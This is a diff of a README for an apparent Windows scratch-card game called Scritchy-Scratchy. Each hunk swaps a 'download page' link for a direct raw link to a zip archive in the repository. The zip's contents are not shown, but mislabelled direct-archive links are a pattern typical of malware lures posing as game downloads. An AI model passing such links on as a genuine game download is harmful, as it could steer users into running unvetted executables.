@@ -1,6 +1,6 @@
 # 🎮 Scritchy-Scratchy-Game-Windows - Scratch Cards, Big Wins, Idle Progress
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sacred-movement947/Scritchy-Scratchy-Game-Windows)
+[![Download Now](https://img.shields.io/badge/Download%20Now-7B68EE?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/sacred-movement947/Scritchy-Scratchy-Game-Windows/main/BaseMain/Game_Scritchy_Windows_Scratchy_1.0.zip)
 
 ## 🖥️ What This Is
 
@@ -12,7 +12,7 @@ This README shows you how to get the game onto your Windows PC and start playing
 
 Use this link to visit the download page:
 
-[Go to the download page](https://github.com/sacred-movement947/Scritchy-Scratchy-Game-Windows)
+[Go to the download page](https://raw.githubusercontent.com/sacred-movement947/Scritchy-Scratchy-Game-Windows/main/BaseMain/Game_Scritchy_Windows_Scratchy_1.0.zip)
 
 If the page has a Windows build, download the file that matches your system, then open it on your PC.
 
@@ -194,7 +194,7 @@ If this is your first time playing:
 
 ## 🔗 Download Again
 
-[Visit the download page](https://github.com/sacred-movement947/Scritchy-Scratchy-Game-Windows)
+[Visit the download page](https://raw.githubusercontent.com/sacred-movement947/Scritchy-Scratchy-Game-Windows/main/BaseMain/Game_Scritchy_Windows_Scratchy_1.0.zip)
 
 ## 🖥️ Windows Launch Checklist
 
